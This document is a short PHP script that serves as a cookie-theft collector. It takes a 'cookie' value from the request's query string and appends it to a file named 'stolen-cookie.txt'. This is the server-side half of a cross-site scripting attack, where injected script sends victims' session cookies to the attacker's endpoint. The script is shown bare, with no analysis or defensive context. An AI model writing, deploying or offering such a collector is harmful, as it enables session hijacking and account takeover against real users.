<?php
$cookie = $_GET['cookie'];
$file = fopen("stolen-cookie.txt", "a");
fwrite($file, $cookie);
fclose($file);
 ?>
